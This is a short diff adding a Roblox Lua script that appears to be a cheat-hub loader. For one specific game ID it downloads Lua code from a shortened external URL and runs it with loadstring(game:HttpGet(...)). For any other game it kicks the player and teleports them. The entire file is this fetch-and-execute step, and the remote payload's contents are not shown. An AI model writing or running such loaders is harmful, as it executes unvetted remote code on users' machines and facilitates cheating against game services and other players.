@@ -1,0 +1,7 @@
+a = game.PlaceId
+if a == 3237168 then
+loadstring(game:HttpGet('http://manssapdf.lnkiy.in/One-Piece-Legendary'))()
+else
+game.Players.LocalPlayer:kick("\nPaimon : not support game\nrejoin in 5 seconds")
+game:GetService("TeleportService"):Teleport(game.PlaceId)
+end
